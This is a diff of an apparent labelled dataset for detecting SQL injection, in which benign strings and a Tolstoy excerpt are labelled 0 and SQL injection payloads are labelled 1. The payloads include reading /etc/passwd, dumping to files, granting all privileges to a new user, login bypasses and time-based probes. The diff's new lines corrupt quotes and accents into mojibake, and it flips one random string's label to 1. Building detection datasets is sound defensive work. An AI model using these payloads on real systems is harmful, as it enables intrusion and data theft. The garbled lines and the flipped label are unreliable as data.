@@ -1,7 +1,7 @@
 0 &aP7[?`\\A
 0 +1E.Av8n4q
 0 G@k^cBbBeS
-0 .gf10s2=xD
+1 .gf10s2=xD
 0 /*5:_hWKAF
 0 wxebY/4xOm
 0 '&nJRH*`cf
@@ -54,9 +54,9 @@
 0 Kutuzov turned away without answering him, and his gaze chanced to rest on Prince Andrei, who was standing
 0 close by. Seeing Bolkonsky, Kutuzov softened the angry and caustic expression of his gaze, as if aware that
 0 his adjutant was not to blame for what was going on. And, without answering the Austrian adjutant, he addressed Bolkonsky:
-0 Allez voir, mon cher, si la troisième division a dépassé le village. Dites-lui de s'arrêter et d'attendre mes ordres.[3]
+0 Allez voir, mon cher, si la troisiï¿½me division a dï¿½passï¿½ le village. Dites-lui de s'arrï¿½ter et d'attendre mes ordres.[3]
 0 Prince Andrei had only just started when he stopped him.
-0 Et demandez-lui si les tirailleurs sont postés, he added. "Ce qu'ils font, ce qu'ils font!"[4]
+0 Et demandez-lui si les tirailleurs sont postï¿½s, he added. "Ce qu'ils font, ce qu'ils font!"[4]
 0 he said to himself, still not answering the Austrian.
 0 Prince Andrei galloped off to carry out his mission.
 0 Overtaking all the advancing battalions, he stopped the third division and ascertained
@@ -77,29 +77,29 @@
 1 SELECT database()
 1 SELECT distinct(db) FROM mysql.db
 1 SELECT schema_name FROM information_schema.schemata;
-1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
-1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
-1 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
+1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ï¿½mysqlï¿½ AND table_schema != ï¿½information_schemaï¿½
+1 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ï¿½mysqlï¿½ AND table_schema != ï¿½information_schemaï¿½
+1 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ï¿½usernameï¿½; ï¿½ find table which have a column called ï¿½usernameï¿½
 1 SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
 1 SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1;
-1 SELECT substr(‘abcd’, 3, 1);
+1 SELECT substr(ï¿½abcdï¿½, 3, 1);
 1 SELECT 6 & 2;
 1 SELECT 6 & 1;
-1 SELECT ascii(‘A’);
-1 SELECT cast(’1? AS unsigned integer);
-1 SELECT cast(’123? AS char);
-1 SELECT CONCAT(‘A’,'B’);
-1 SELECT CONCAT(‘A’,'B’,'C’);
-1 SELECT if(1=1,’foo’,'bar’);
-1 SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
-1 SELECT 0×414243;
-1 SELECT BENCHMARK(1000000,MD5(‘A’)); SELECT SLEEP(5);
-1 UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)
-1 SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
+1 SELECT ascii(ï¿½Aï¿½);
+1 SELECT cast(ï¿½1? AS unsigned integer);
+1 SELECT cast(ï¿½123? AS char);
+1 SELECT CONCAT(ï¿½Aï¿½,'Bï¿½);
+1 SELECT CONCAT(ï¿½Aï¿½,'Bï¿½,'Cï¿½);
+1 SELECT if(1=1,ï¿½fooï¿½,'barï¿½);
+1 SELECT CASE WHEN (1=1) THEN ï¿½Aï¿½ ELSE ï¿½Bï¿½ END;
+1 SELECT 0ï¿½414243;
+1 SELECT BENCHMARK(1000000,MD5(ï¿½Aï¿½)); SELECT SLEEP(5);
+1 UNION ALL SELECT LOAD_FILE(ï¿½/etc/passwdï¿½)
+1 SELECT * FROM mytable INTO dumpfile ï¿½/tmp/somefileï¿½;
 1 SELECT @@hostname;
-1 CREATE USER test1 IDENTIFIED BY ‘pass1?;
+1 CREATE USER test1 IDENTIFIED BY ï¿½pass1?;
 1 DROP USER test1;
-1 GRANT ALL PRIVILEGES ON *.* TO test1@’%';
+1 GRANT ALL PRIVILEGES ON *.* TO test1@ï¿½%';
 1 SELECT @@datadir;
 1 admin'--
 1 admin'#
@@ -225,8 +225,8 @@
 1 1)) or sleep(__TIME__)#
 1 23 OR 1=1
 1 29 %
-1 â or 1=1 --
-1 â or 3=3 --
+1 ï¿½ or 1=1 --
+1 ï¿½ or 3=3 --
 1 a' or 'a' = 'a
 1 a' or 1=1--
 1 a' or 3=3--
